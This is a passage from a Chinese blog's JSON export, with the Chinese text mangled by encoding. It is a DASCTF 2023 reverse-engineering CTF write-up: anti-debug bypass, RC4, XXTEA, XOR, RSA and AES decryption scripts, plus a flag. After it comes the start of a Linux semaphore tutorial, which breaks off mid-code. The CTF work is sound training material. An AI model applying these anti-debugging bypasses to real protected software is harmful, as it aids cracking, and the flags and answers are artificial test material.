writeup","slug":"DASCTF-2023å…­æœˆæŒ‘æˆ˜èµ›-äºŒè¿›åˆ¶ä¸“é¡¹-RE-writeup","date":"2023-06-04T10:24:07.000Z","updated":"2023-09-03T16:43:42.968Z","comments":true,"path":"DASCTF-2023å…­æœˆæŒ‘æˆ˜èµ›-äºŒè¿›åˆ¶ä¸“é¡¹-RE-writeup/","link":"","permalink":"https://oacia.dev/DASCTF-2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-RE-writeup/","excerpt":"","text":"å¸¸å¹´ä¸å»ä¸Šæ—©å…«è¯¾çš„äººï¼Œä»Šå¤©å±…ç„¶åœ¨å…«ç‚¹å‰å°±é†’äº†ï¼Œè¦é—®ä¸ºä»€ä¹ˆï¼Ÿè¿™æ¯”èµ›ä»æ—©ä¸Šå…«ç‚¹æ‰“åˆ°æ™šä¸Šå…«ç‚¹ &gt;â€¦&lt;(æ‚²) ä¸è¿‡ï¼Œå’±ä»¬é˜Ÿä¼åœ¨ä¸‹åˆå°±æŠŠé€†å‘é¢˜ ak äº†ï½å±…ç„¶æ²¡æœ‰åç‰¢åˆ°æ™šä¸Š (â—â€™â—¡â€™â—) é¢˜ç›®é™„ä»¶: ç‚¹å‡»ä¸‹è½½ # careful åŠ¨æ€è°ƒè¯•ï¼Œé¢˜ç›®é‡Œæœ‰ä¸ª inline hook, åœ¨è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹ é‚£ä¹ˆç½‘å€å°±æ˜¯ Just_An_APIH00k11.com # babyre die æŸ¥ä¸€ä¸‹å£³ æœ‰ sleep åè°ƒè¯•ï¼ŒæŠŠ sleep nop æ‰ è¿™é‡Œè¯»å–äº†åç§°ä¸º cod çš„èµ„æºï¼Œç”¨ resource hacker æŠŠèµ„æºå¤åˆ¶ä¸‹æ¥ ç„¶åå‘ä¸‹æ‰§è¡Œï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªå¯¹ cod èµ„æºè¿›è¡Œè§£å¯†çš„åœ°æ–¹ è¿™é‡Œè¦æ³¨æ„çš„æ˜¯å¦‚æœæ£€æµ‹åˆ°è°ƒè¯•å™¨ï¼Œé‚£ä¹ˆ byte_7FF6DA64F000[3] å°†ä¼šè¢«èµ‹å€¼ä¸º 36 æ‰€ä»¥è¦æŠŠè¿™ä¸ª if è¯­å¥é€šè¿‡ä¿®æ”¹ ZF æ ‡å¿—ä½çš„æ–¹å¼æ¥ç»•è¿‡åè°ƒè¯• cod èµ„æºè§£å¯†è„šæœ¬å¦‚ä¸‹ arr = [0x18, 0x57, 0x68, 0x64]with open('COD101.bin', 'rb') as f: b = f.read()b = bytearray(b)for i in range(len(b)): b[i] = b[i] ^ arr[i % 4]with open('COD_de.bin', 'wb') as f: f.write(b)ç”¨ ida æ‰“å¼€ï¼Œçœ‹åˆ°æœ‰èŠ±æŒ‡ä»¤ nop ä¸€ä¸‹ï¼Œä¸»è¦çš„æ”¹åŠ¨æœ‰è¿™å‡ å¤„ â€‹ äºæ˜¯å¾—åˆ°å¦‚ä¸‹çš„ä¼ªä»£ç  çœ‹ç®—æ³•æ˜¯é­”æ”¹çš„ RC4,exp å¦‚ä¸‹ class RC4: def __init__(self, key) -> None: self.key = key self.S = 0 self.__rc4_init__() def __rc4_init__(self): S = [i for i in range(256)] j = 0 for i in range(256): j = (2 * j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] self.S = S def rc4_encrypt(self, plain) -> list: i = 0 j = 0 cipher = [] cnt = 0 for p in plain: p = (p + 256 - cnt % 0xd) % 256 cnt += 1 i = (i + j) % 256 j = (j + self.S[i]) % 256 self.S[i], self.S[j] = self.S[j], self.S[i] tmp = self.S[(self.S[i] + self.S[j] + j) % 256] k = p ^ tmp cipher.append(k) return cipherkey = [0x5D , 0x42 , 0x62 , 0x29 , 0x3, 0x36 , 0x47 , 0x41 , 0x15, 0x36]data = [0xF7, 0x2E, 0x34, 0xF0, 0x72, 0xCF, 0x5E, 0x0A, 0xBB, 0xEC, 0xB1, 0x2B, 0x70, 0x88, 0x88, 0xED,0x46, 0x38, 0xDB, 0xDA, 0x6C, 0xBD, 0xD4, 0x06, 0x77, 0xF2, 0xCF, 0x56, 0x88, 0xC6, 0x31, 0xD2,0xB7, 0x5A, 0xC1, 0x42, 0xB0, 0xF4, 0x48, 0x37, 0xF5, 0x2C, 0xF5, 0x58]rc4 = RC4(key)plain = rc4.rc4_encrypt(data)print(''.join(map(chr,plain)))# ez_exe æŸ¥ä¸ªå£³ï¼Œæ˜¯ python é€†å‘ ç”¨ pyinstxtractor è„±ä¸€ä¸‹ ç”¨åœ¨çº¿ç½‘ç«™çœ‹ä¸€ä¸‹ ez_py.pyc çš„æºä»£ç  #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11import ctypesfrom time import *from ctypes import *from ctypes import wintypesfrom hashlib import md5class _STARTUPINFO(Structure): _fields_ = [ ('cb', c_ulong), ('lpReserved', c_char_p), ('lpDesktop', c_char_p), ('lpTitle', c_char_p), ('dwX', c_ulong), ('dwY', c_ulong), ('dwXSize', c_ulong), ('dwYSize', c_ulong), ('dwXCountChars', c_ulong), ('dwYCountChars', c_ulong), ('dwFillAttribute', c_ulong), ('dwFlags', c_ulong), ('wShowWindow', c_ushort), ('cbReserved2', c_ushort), ('lpReserved2', c_char_p), ('hStdInput', c_ulong), ('hStdOutput', c_ulong), ('hStdError', c_ulong)]class _PROCESS_INFORMATION(Structure): _fields_ = [ ('hProcess', c_void_p), ('hThread', c_void_p), ('dwProcessId', c_ulong), ('dwThreadId', c_ulong)]StartupInfo = _STARTUPINFO()ProcessInfo = _PROCESS_INFORMATION()key1 = bytes(md5(b'bin1bin1bin1').hexdigest().encode())file = open('bin1', 'rb').read()arr = range(len(file))()open('bin1', 'wb').write(bytes(arr))sleep(0)bet = ctypes.windll.kernel32.CreateProcessA(b'bin1', ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), byref(StartupInfo), byref(ProcessInfo))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ProcessInfo.hProcess), ctypes.c_int(-1))open('bin1', 'wb').write(file)ç”¨ ida åç¼–è¯‘ bin1 å¤±è´¥ï¼Œçœ‹æ¥æ˜¯è¢«åŠ å¯†äº† ç”¨è¿™ä¸ªä»£ç çœ‹ä¸€ä¸‹å­—èŠ‚ç  import marshal, disf = open(\"ez_py.pyc\", \"rb\").read()code = marshal.loads(f[16:]) #è¿™è¾¹ä» 16 ä½å¼€å§‹å–å› ä¸ºæ˜¯ python3 python2 ä» 8 ä½å¼€å§‹å–dis.dis(code)åœ¨æœ€åé¢å¾—åˆ°äº†è¿™ä¸ª Disassembly of &lt;code object &lt;listcomp> at 0x00000297CC7F8E70, file \"ez_py.py\", line 59>: 59 0 RESUME 0 2 BUILD_LIST 0 4 LOAD_FAST 0 (.0) >> 6 FOR_ITER 50 (to 108) 8 STORE_FAST 1 (i) 10 LOAD_GLOBAL 0 (key1) 22 LOAD_FAST 1 (i) 24 LOAD_GLOBAL 3 (NULL + len) 36 LOAD_GLOBAL 0 (key1) 48 PRECALL 1 52 CALL 1 62 BINARY_OP 6 (%) 66 BINARY_SUBSCR 76 LOAD_GLOBAL 4 (file) 88 LOAD_FAST 1 (i) 90 BINARY_SUBSCR 100 BINARY_OP 12 (^) 104 LIST_APPEND 2 106 JUMP_BACKWARD 51 (to 6) >> 108 RETURN_VALUEé‚£ä¹ˆè§£å¯†ä»£ç å¦‚ä¸‹ from hashlib import md5key1 = bytes(md5(b'bin1bin1bin1').hexdigest().encode())# print(key1)file = open('bin1', 'rb').read()arr = [key1[i % len(key1)] ^ file[i] for i in range(len(file))]# open('bin1', 'wb').write(bytes(arr))with open('bin1__','wb') as f: f.write(bytes(arr))åç¼–è¯‘å‡ºæ¥æ˜¯è¿™ä¸ª é‚£æ ¹æ®æç¤ºæˆ‘ä»¬æŠŠä¸Šé¢çš„è§£å¯†è„šæœ¬ç¨ä½œä¿®æ”¹ from hashlib import md5key1 = bytes(md5(b'bin2bin2bin2').hexdigest().encode())# print(key1)file = open('bin2', 'rb').read()arr = [key1[i % len(key1)] ^ file[i] for i in range(len(file))]# open('bin1', 'wb').write(bytes(arr))with open('bin2__','wb') as f: f.write(bytes(arr))ç„¶åç”¨ ida åç¼–è¯‘ bin2__ é‚£ä¹ˆè¿™å°±æ˜¯æ­£å¸¸çš„é€†å‘é¢˜äº† btea å‡½æ•°é‡Œé¢æ˜¯è¿™ä¸ªï¼Œè¿™æ˜¯ä¸€ä¸ª xxtea ç®—æ³• å†™ä¸€ä¸‹ exp #include &lt;iostream>#include &lt;stdio.h>using namespace std;#include &lt;stdint.h>#define DELTA 0x7937B99E#define MX (((z>>5^y&lt;&lt;2) + (y>>3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t* v, int n, uint32_t const key[4]) &#123; uint32_t y, z, sum; unsigned p, rounds, e; if (n > 1) &#123; /* Coding Part */ rounds = /*6 + */52 / n; sum = 0; z = v[n - 1]; do &#123; sum += DELTA; e = (sum >> 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) &#123; /* Decoding Part */ n = -n; rounds = /*6 + */52 / n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum >> 2) &amp; 3; for (p = n - 1; p > 0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; &#125; while ((sum -= DELTA) != 0); &#125;&#125;int main()&#123; uint32_t const key[4] = &#123; 0x4B5F, 0xDEAD, 0x11ED, 0xB3CC &#125;; uint32_t data[11] = &#123; 0xCC45699D, 0x683D5352,0xB8BB71A0,0xD3817AD,0x7547E79E,0x4BDD8C7C,0x95E25A81,0xC4525103,0x7049B46F,0x5417F77C,0x65567138 &#125;; uint32_t* sent = data; //btea(sent, 11, key); //printf(\"coded:%x %x\\n\", sent[0], sent[1]); btea(sent, -11, key); //printf(\"decoded:%x %x\\n\", sent[0], sent[1]); for (int i = 0; i &lt; 11; i++) &#123; for (int j = 0; j &lt; 4; j++) &#123; printf(\"%c\", sent[i] &amp; 0xff); sent[i] >>= 8; &#125; &#125; return 0;&#125;//DASCTF&#123;7eb20cb2-deac-11ed-ae42-94085339ce84&#125;# cap åœ¨è¿™ä¸ªåœ°æ–¹åŠ¨è°ƒ å¯ä»¥å‘ç°æ•°ç»„çš„ä¸‹æ ‡åœ¨ 0~12 ä¹‹é—´å¾ªç¯ æˆ‘ä»¬éšä¾¿æ‰“å¼€ä¸€ä¸ª BMP ç±»å‹çš„æ–‡ä»¶ï¼Œç”¨ 010 çœ‹çœ‹ å¯¹äº BMP ç±»å‹çš„æ–‡ä»¶å‰ä¸¤ä¸ªå­—èŠ‚å¿…å®šæ˜¯ 43 4D æ—¢ç„¶è¿™ä¸ªåŠ å¯†çš„ bmp çš„æ¯ä¸€ä¸ªå­—èŠ‚è¿›è¡Œçš„éƒ½æ˜¯å¼‚æˆ–ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°†å‰ä¸¤ä¸ªå­—èŠ‚å¼‚æˆ–çœ‹çœ‹ n å’Œ c æ˜¯å¯†é’¥ enc_by_dasctf çš„ç¬¬ 2 ä¸ªå’Œç¬¬ 3 ä¸ªå­—ç¬¦ï¼ŒæŒ‰ç…§è¿™ä¸ªåºåˆ—ï¼Œæˆ‘ä»¬å‘åå°†å¯†é’¥å‘åå»¶ç”³çœ‹çœ‹åé¢çš„æƒ…å†µå¦‚ä½• æ‰€ä»¥æˆ‘ä»¬å†™ä¸ªè„šæœ¬ï¼Œä»å¯†é’¥çš„ç¬¬äºŒä½å¼€å§‹ï¼Œå¾ªç¯å¼‚æˆ– key = \"enc_by_dasctf\"with open('cap.bin', 'rb') as f: s = bytearray(f.read())for i in range(len(s)): s[i] ^= ord(key[(i+1) % len(key)])with open('flag.bmp', 'wb') as f: f.write(s)å¾—åˆ° flag # unsym æŸ¥ä¸€ä¸‹å£³ï¼Œæ˜¯ go é€†å‘ ç”¨è¿™ä¸ªè„šæœ¬æ¢å¤ä¸€ä¸‹ go ç¬¦å· https://github.com/renshareck/IDAGolangHelper_SupportGo1.20 ä¾æ¬¡ç‚¹å‡»å¦‚ä¸‹æŒ‰é’® é¦–å…ˆåˆ¤æ–­ key æ­£ç¡®ä¸å¦ï¼Œçœ‹æ¥è¿™æ˜¯ä¸ª rsa ç”¨ yafu è§£ä¸€ä¸‹ p å’Œ q ç„¶åè§£å‡ºå¯†é’¥ import gmpy2from Crypto.Util.number import long_to_bytesn = 0x1d884d54d21694ccd120f145c8344b729b301e782c69a8f3073325b9c5p = 37636318457745167234140808130156739q = 21154904887215748949280410616478423c = 0xfad53ce897d2c26f8cad910417fbdd1f0f9a18f6c1748faca10299dc8e = 0x10001phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(long_to_bytes(m))# E@sy_RSA_enc7yptå†å¾€åçœ‹ï¼Œ åŠ¨è°ƒäº†ä¸€ä¸‹çœ‹åˆ° iv å’Œ key éƒ½æ˜¯ä¸€æ ·çš„ æ‰€ä»¥ç›´æ¥å†™ä¸ª exp æŠŠåŠ å¯†çš„æ–‡ä»¶è§£å¯† from Crypto.Cipher import AESpassword = b'E@sy_RSA_enc7ypt' # ç§˜é’¥å¿…é¡»ä¸º 16 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚çš„å€æ•°çš„å­—èŠ‚å‹æ•°æ®iv = b'E@sy_RSA_enc7ypt' # iv åç§»é‡ï¼Œbytes ç±»å‹with open('encrypted.bin','rb') as f: en_text = f.read()aes = AES.new(password, AES.MODE_CBC, iv) # CBC æ¨¡å¼ä¸‹è§£å¯†éœ€è¦é‡æ–°åˆ›å»ºä¸€ä¸ª aes å¯¹è±¡de_text = aes.decrypt(en_text)with open('decrypt.exe','wb') as f: f.write(de_text)è¿è¡Œä¸€ä¸‹è§£å¯†å‡ºçš„ exe, å°±å¾—åˆ° flag äº†","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"pythoné€†å‘","slug":"pythoné€†å‘","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"goé€†å‘","slug":"goé€†å‘","permalink":"https://oacia.dev/tags/go%E9%80%86%E5%90%91/"},{"name":"inline hook","slug":"inline-hook","permalink":"https://oacia.dev/tags/inline-hook/"},{"name":"IsDebuggerPresent","slug":"IsDebuggerPresent","permalink":"https://oacia.dev/tags/IsDebuggerPresent/"},{"name":"sleepåè°ƒè¯•","slug":"sleepåè°ƒè¯•","permalink":"https://oacia.dev/tags/sleep%E5%8F%8D%E8%B0%83%E8%AF%95/"}]},{"title":"Linuxè¿›ç¨‹é€šä¿¡","slug":"Linuxè¿›ç¨‹é€šä¿¡","date":"2023-05-25T02:12:08.000Z","updated":"2023-09-14T11:02:58.951Z","comments":true,"path":"Linuxè¿›ç¨‹é€šä¿¡/","link":"","permalink":"https://oacia.dev/Linux%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/","excerpt":"","text":"åœ¨æ—¥å¸¸é‡åˆ°çš„.so,.elf æ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¸¸å¸¸å¯ä»¥çœ‹åˆ° Linux è¿›ç¨‹é€šä¿¡çš„ä½¿ç”¨ï¼Œæ¥ä¸‹æ¥çš„éƒ¨åˆ†ï¼Œæˆ‘å°†ä»‹ç» Linux é€šä¿¡çš„å„ç§å®ç°æ–¹å¼ä»¥åŠç›¸åº”çš„ä»£ç ç¤ºä¾‹ ä»€ä¹ˆæ˜¯è¿›ç¨‹ï¼Ÿ è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µï¼Œæ¯å½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªç¨‹åºæ—¶ï¼Œå¯¹äºæ“ä½œç³»ç»Ÿæ¥è®²å°±åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¼´éšç€èµ„æºçš„åˆ†é…å’Œé‡Šæ”¾ã€‚å¯ä»¥è®¤ä¸ºè¿›ç¨‹æ˜¯ä¸€ä¸ªç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ã€‚ ä»€ä¹ˆæ˜¯è¿›ç¨‹é€šä¿¡ï¼Ÿ è¿›ç¨‹ç”¨æˆ·ç©ºé—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œä¸€èˆ¬è€Œè¨€æ˜¯ä¸èƒ½ç›¸äº’è®¿é—®çš„ã€‚ä½†å¾ˆå¤šæƒ…å†µä¸‹è¿›ç¨‹é—´éœ€è¦äº’ç›¸é€šä¿¡ï¼Œæ¥å®Œæˆç³»ç»Ÿçš„æŸé¡¹åŠŸèƒ½ã€‚è¿›ç¨‹é€šè¿‡ä¸å†…æ ¸åŠå…¶å®ƒè¿›ç¨‹ä¹‹é—´çš„äº’ç›¸é€šä¿¡æ¥åè°ƒå®ƒä»¬çš„è¡Œä¸ºã€‚ ä»€ä¹ˆæ—¶å€™ä¼šç”¨åˆ°è¿›ç¨‹é€šä¿¡ï¼Ÿ æ•°æ®ä¼ è¾“ï¼šä¸€ä¸ªè¿›ç¨‹éœ€è¦å°†å®ƒçš„æ•°æ®å‘é€ç»™å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œå‘é€çš„æ•°æ®é‡åœ¨ä¸€ä¸ªå­—èŠ‚åˆ°å‡ å…†å­—èŠ‚ä¹‹é—´ã€‚ å…±äº«æ•°æ®ï¼šå¤šä¸ªè¿›ç¨‹æƒ³è¦æ“ä½œå…±äº«æ•°æ®ï¼Œä¸€ä¸ªè¿›ç¨‹å¯¹å…±äº«æ•°æ®çš„ä¿®æ”¹ï¼Œåˆ«çš„è¿›ç¨‹åº”è¯¥ç«‹åˆ»çœ‹åˆ°ã€‚ é€šçŸ¥äº‹ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹éœ€è¦å‘å¦ä¸€ä¸ªæˆ–ä¸€ç»„è¿›ç¨‹å‘é€æ¶ˆæ¯ï¼Œé€šçŸ¥å®ƒï¼ˆå®ƒä»¬ï¼‰å‘ç”Ÿäº†æŸç§äº‹ä»¶ï¼ˆå¦‚è¿›ç¨‹ç»ˆæ­¢æ—¶è¦é€šçŸ¥çˆ¶è¿›ç¨‹ï¼‰ã€‚ èµ„æºå…±äº«ï¼šå¤šä¸ªè¿›ç¨‹ä¹‹é—´å…±äº«åŒæ ·çš„èµ„æºã€‚ä¸ºäº†ä½œåˆ°è¿™ä¸€ç‚¹ï¼Œéœ€è¦å†…æ ¸æä¾›é”å’ŒåŒæ­¥æœºåˆ¶ã€‚ è¿›ç¨‹æ§åˆ¶ï¼šæœ‰äº›è¿›ç¨‹å¸Œæœ›å®Œå…¨æ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œï¼ˆå¦‚ Debug è¿›ç¨‹ï¼‰ï¼Œæ­¤æ—¶æ§åˆ¶è¿›ç¨‹å¸Œæœ›èƒ½å¤Ÿæ‹¦æˆªå¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰é™·å…¥å’Œå¼‚å¸¸ï¼Œå¹¶èƒ½å¤ŸåŠæ—¶çŸ¥é“å®ƒçš„çŠ¶æ€æ”¹å˜ã€‚ # POSIX ä¿¡å·é‡ linux sem ä¿¡å·é‡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å˜é‡ï¼Œè®¿é—®å…·æœ‰åŸå­æ€§ï¼Œ ç”¨äºè§£å†³è¿›ç¨‹æˆ–çº¿ç¨‹é—´å…±äº«èµ„æºå¼•å‘çš„åŒæ­¥é—®é¢˜ã€‚ ç”¨æˆ·æ€è¿›ç¨‹å¯¹ sem ä¿¡å·é‡å¯ä»¥æœ‰ä»¥ä¸‹ä¸¤ç§æ“ä½œï¼š ç­‰å¾…ä¿¡å·é‡ å½“ä¿¡å·é‡å€¼ä¸º 0 æ—¶ï¼Œç¨‹åºç­‰å¾…ï¼›å½“ä¿¡å·é‡å€¼å¤§äº 0 æ—¶ï¼Œä¿¡å·é‡å‡ 1ï¼Œç¨‹åºç»§ç»­è¿è¡Œã€‚ å‘é€ä¿¡å·é‡ å°†ä¿¡å·é‡å€¼åŠ  1 é€šè¿‡å¯¹ä¿¡å·é‡çš„æ§åˆ¶ï¼Œä»è€Œå®ç°å…±äº«èµ„æºçš„é¡ºåºè®¿é—®ã€‚ ä½¿ç”¨ä¿¡å·é‡éœ€è¦åŒ…å«å¤´æ–‡ä»¶ semaphore.h # æœ‰åä¿¡å·é‡å‡½æ•° æœ‰åä¿¡å·é‡æ˜¯é€šè¿‡ sem_open åˆ›å»ºæˆ–æ‰“å¼€ä¿¡å·é‡ï¼Œç”¨ sem_close å…³é—­ä¿¡å·é‡ï¼Œç”¨ sem_unlink é”€æ¯ä¿¡å·é‡ã€‚ # sem_open åˆ›å»ºå¹¶åˆå§‹åŒ–æˆ–è€…æ‰“å¼€ä¸€ä¸ªå·²æœ‰çš„æœ‰åä¿¡å·é‡ /*@param name: ä¿¡å·é‡æ–‡ä»¶çš„åå­—ã€‚è¯¥åå­—å¯ä»¥åœ¨æœ€å‰é¢åŠ  \"/\"ï¼Œåœ¨ä¹‹åä¸èƒ½å†åŠ  \"/\"ï¼Œä½†æ˜¯æ— è®ºåŠ ä¸åŠ  \"/\"ï¼ŒæŒ‡å®šçš„æ–‡ä»¶éƒ½æ˜¯ /dev/shm/sem.xxxã€‚æ¯”å¦‚ä¼ å…¥çš„ name ä¸º \"mysem\"ï¼Œé‚£ä¹ˆæŒ‡å®šçš„æ˜¯ /dev/shm/sem.mysem@param oflag: æ‰“å¼€çš„æ ‡å¿—ï¼Œå¦‚æœéœ€è¦æ‰“å¼€å·²ç»å­˜åœ¨çš„ä¿¡å·é‡æ–‡ä»¶ï¼Œåˆ™ä¼ å…¥ O_RDWR å³å¯ï¼Œä¸ç”¨å†ä¼ å…¥åä¸¤ä¸ªå‚æ•°ã€‚å¦‚æœéœ€è¦åˆ›å»ºä¿¡å·é‡ï¼Œåˆ™ä¼ å…¥ O_CREATï¼Œå¦‚æœæŒ‡å®šçš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼Œç”±åä¸¤ä¸ªå‚æ•°æŒ‡å®šæ–‡ä»¶æƒé™å’Œä¿¡å·é‡çš„åˆå€¼ã€‚å¦‚æœæŒ‡å®šçš„æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™æ‰“å¼€ä¿¡å·é‡æ–‡ä»¶ï¼Œå¹¶å¿½ç•¥åä¸¤ä¸ªå‚æ•°ã€‚å¦‚æœä¼ å…¥çš„æ˜¯ O_CREAT|O_EXCLé‚£ä¹ˆä¼šæ£€æŸ¥æŒ‡å®šçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆ sem_open ä¼šè¿”å› - 1ã€‚@param mode: ä¸€èˆ¬ä¼ å…¥ 0666 (å¯è¯»å¯å†™)@param value: ä¿¡å·é‡åˆå€¼@return: æˆåŠŸæ—¶å‡½æ•°è¿”å›æœ‰åä¿¡å·é‡çš„åœ°å€ï¼Œå¤±è´¥æ—¶è¿”å› SEM_FAILEDï¼Œå…¶å€¼ä¸º ((void *) 0)ã€‚*/sem_t *sem_open(const char *name, int oflag, mode_t mode, unsigned int value);# sem_close å…³é—­ä¿¡å·é‡ è¯¥å‡½æ•°åº”è¯¥ä¸ sem_open æˆå¯¹è°ƒç”¨ /*@param sem: ä¿¡å·é‡åœ°å€@return: æˆåŠŸè¿”å› 0ï¼Œå¤±è´¥è¿”å› - 1*/int sem_close(sem_t *sem);# sem_unlink åˆ é™¤ä¿¡å·é‡æ–‡ä»¶ POSIX ä¸­çš„ä¿¡å·é‡æ˜¯éšå†…æ ¸æŒç»­çš„ï¼Œå¦‚æœä¿¡å·é‡ä¸ sem_unlink çš„è¯ï¼Œè¯¥å‘½åä¿¡å·é‡ä¼šå¸¸é©»åœ¨ kernel ä¹‹ä¸­ï¼Œå³ä½¿è¿›ç¨‹ç»“æŸäº†ä¹Ÿä¼šå­˜åœ¨ï¼Œè€Œ sem_open åˆ›å»ºä¿¡å·é‡æ—¶ï¼Œå¦‚æœè¯¥ named semaphore å­˜åœ¨å†…æ ¸ä¸­ï¼Œè®¾ç½®çš„åˆå§‹åŒ–å‚æ•°æ˜¯æ— æ•ˆçš„ /*@param name: ä¿¡å·é‡æ–‡ä»¶çš„åç§°@return: æˆåŠŸè¿”å› 0ï¼Œå¤±è´¥è¿”å› - 1*/int sem_unlink(const char *name);# æ— åä¿¡å·é‡å‡½æ•° æ— åä¿¡å·é‡é€šè¿‡ sem_init è¿›è¡Œåˆå§‹åŒ–ï¼Œä½¿ç”¨å®Œä¹‹åç”¨ sem_destroy è¿›è¡Œé”€æ¯ï¼Œå¸¸ç”¨åœ¨çº¿ç¨‹é—´ # sem_init è¯¥å‡½æ•°åˆå§‹åŒ–ç”± sem æŒ‡å‘çš„ä¿¡å·å¯¹è±¡ï¼Œå¹¶ç»™å®ƒä¸€ä¸ªåˆå§‹çš„æ•´æ•°å€¼ valueã€‚ /*@param sem: è¦åˆå§‹åŒ–çš„ç›®æ ‡ä¿¡å·é‡@param pshared: æ§åˆ¶ä¿¡å·é‡çš„ç±»å‹ï¼Œå€¼ä¸º 0 ä»£è¡¨è¯¥ä¿¡å·é‡ç”¨äºå¤šçº¿ç¨‹é—´çš„åŒæ­¥ï¼Œå€¼å¦‚æœå¤§äº 0 è¡¨ç¤ºå¯ä»¥å…±äº«ï¼Œç”¨äºå¤šä¸ªç›¸å…³è¿›ç¨‹é—´çš„åŒæ­¥@return : å½“ sem_init () æˆåŠŸå®Œæˆåˆå§‹åŒ–æ“ä½œæ—¶ï¼Œè¿”å›å€¼ä¸º 0ï¼Œå¦åˆ™è¿”å› -1*/int sem_init(sem_t *sem, int pshared, unsigned int value);# sem_destroy è¯¥å‡½æ•°ç”¨äºå¯¹ç”¨å®Œçš„ä¿¡å·é‡çš„æ¸…ç† /*@param sem: è¦åˆå§‹åŒ–çš„ç›®æ ‡ä¿¡å·é‡@return : å½“ sem_destroy æˆåŠŸå®Œæˆä¿¡å·é‡çš„æ¸…ç†æ—¶ï¼Œè¿”å›å€¼ä¸º 0, å¦åˆ™è¿”å› -1*/int sem_destroy(sem_t *sem);# ä¿¡å·é‡é€šç”¨å‡½æ•° # sem_wait sem_wait æ˜¯ä¸€ä¸ªé˜»å¡çš„å‡½æ•°ï¼Œæµ‹è¯•æ‰€æŒ‡å®šä¿¡å·é‡çš„å€¼ï¼Œå®ƒçš„æ“ä½œæ˜¯åŸå­çš„ã€‚è‹¥ sem value &gt; 0ï¼Œåˆ™è¯¥ä¿¡å·é‡å€¼å‡å» 1 å¹¶ç«‹å³è¿”å›ã€‚è‹¥ sem value = 0ï¼Œåˆ™é˜»å¡ç›´åˆ° sem value &gt; 0ï¼Œæ­¤æ—¶ç«‹å³å‡å» 1ï¼Œç„¶åè¿”å›ã€‚ /*@param sem: è¦åˆå§‹åŒ–çš„ç›®æ ‡ä¿¡å·é‡*/int sem_wait(sem_t *sem);sem_trywait å‡½æ•°æ˜¯éé˜»å¡çš„å‡½æ•°ï¼Œå®ƒä¼šå°è¯•è·å–è·å– sem value å€¼ï¼Œå¦‚æœ sem value = 0ï¼Œä¸æ˜¯é˜»å¡ä½ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›ä¸€ä¸ªé”™è¯¯ EAGAINã€‚ /*@param sem: è¦åˆå§‹åŒ–çš„ç›®æ ‡ä¿¡å·é‡*/int sem_trywait(sem_t *sem);# sem_post æŠŠæŒ‡å®šçš„ä¿¡å·é‡ sem çš„å€¼åŠ  1ï¼Œå”¤é†’æ­£åœ¨ç­‰å¾…è¯¥ä¿¡å·é‡çš„ä»»æ„çº¿ç¨‹ /*@param sem: è¦åˆå§‹åŒ–çš„ç›®æ ‡ä¿¡å·é‡*/int sem_post(sem_t *sem);# sem_getvalue è·å–ä¿¡å·é‡ sem çš„å½“å‰å€¼ï¼ŒæŠŠè¯¥å€¼ä¿å­˜åœ¨ svalï¼Œè‹¥æœ‰ 1 ä¸ªæˆ–è€…å¤šä¸ªçº¿ç¨‹æ­£åœ¨è°ƒç”¨ sem_wait é˜»å¡åœ¨è¯¥ä¿¡å·é‡ä¸Šï¼Œè¯¥å‡½æ•°è¿”å›é˜»å¡åœ¨è¯¥ä¿¡å·é‡ä¸Šè¿›ç¨‹æˆ–çº¿ç¨‹ä¸ªæ•° /*@param sem: è¦åˆå§‹åŒ–çš„ç›®æ ‡ä¿¡å·é‡*/int sem_getvalue(sem_t *sem, int *sval);# ç¤ºä¾‹ä¸€: 4 ä¸ªå”®ç¥¨å‘˜å– 10 å¼ ç¥¨ #include&lt;stdio.h>#include&lt;stdlib.h>#include&lt;pthread.h>#include&lt;semaphore.h>#include&lt;unistd.h>// åˆ›å»ºä¿¡å·é‡sem_t mySem;// è®¾ç½®æ€»ç¥¨æ•°int ticket_sum = 10;// 